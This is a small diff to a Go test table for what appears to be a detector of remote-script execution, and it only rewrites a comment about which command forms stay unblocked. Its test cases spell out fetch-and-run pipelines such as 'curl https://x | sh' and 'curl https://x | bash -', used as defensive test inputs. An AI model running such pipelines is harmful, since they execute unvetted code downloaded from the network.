@@ -152,7 +152,8 @@ func TestRemoteScriptOutsideTheRecognizer(t *testing.T) {
 		{"assignment-looking word without a name", []string{"sh", "-c", "=x curl https://x | sh"}},
 		{"stdin dash sink is outside the set", []string{"sh", "-c", "curl https://x | bash -"}},
 		{"bare terminator sink is outside the set", []string{"sh", "-c", "curl https://x | sh --"}},
-		// #622: unmodeled outer forms stay unblocked (egress labels them unknown).
+		// #622: unmodeled outer forms, and forms that run a script file, stay
+		// unblocked (egress labels them unknown or interpreter).
 		{"parse-only -n", []string{"bash", "-n", "-c", "curl https://x | sh"}},
 		{"parse-only noexec", []string{"bash", "-o", "noexec", "-c", "curl https://x | sh"}},
 		{"stdin flag with -c", []string{"bash", "-s", "-c", "curl https://x | sh"}},
